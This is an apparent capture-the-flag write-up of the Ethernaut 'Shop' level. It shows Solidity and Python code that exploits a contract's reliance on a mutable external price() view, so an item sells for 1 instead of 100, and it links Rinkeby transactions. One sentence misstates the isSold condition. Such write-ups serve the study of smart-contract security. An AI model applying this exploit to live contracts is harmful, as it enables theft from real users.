# Shop

## Objectives

Сan you get the item from the shop for less than the price asked?

## Solution

It is possible to return different values based on the state variable `isSold`. After the check passes where `_buyer.price() >= price && !isSold` returns true, we can internally change our contract so that the value that `price()` returns changes based on `isSold`.

All we have to do is make sure the function `price()` returns 100 when `isSold` is false and a value under 100 when `isSold` is false.

## How I did it

1. Code and deploy a Buyer contract (at: `0xB9dcacbc393D15fEa292705d66c1549035CcB3ee`) where I define the `price()` function as follows:

```js
function price() public view returns (uint256) {
    if (shopContract.isSold()) {
        return 1;
    } else {
        return 100;
    }
}
```

If `isSold` is true, the price gets overwritten by a 1, however, in the if statement, we pass the check (requiring `price()` to return 100) since `isSold` is still false.

In python:

```python
buyer = Buyer.deploy(shop.address, _from)
```

2. Call the buy function in the Shop contract, which the Shop contract expects to see coming from another contract (in this case my Buyer contract).

```python
buyer.shop(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x2bcb495224d8fbf2ab49a0750336ff0ec2b9cb07e824022381655e51e589335b

3. Confirm that the price < 100

```python
price_assertion = shop.price() < 100
print(f"The selling price is below 100: {price_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xae682a54188a7c3de2a542e0a5699bc39a908dff1c14e8cfaa9039e593413331
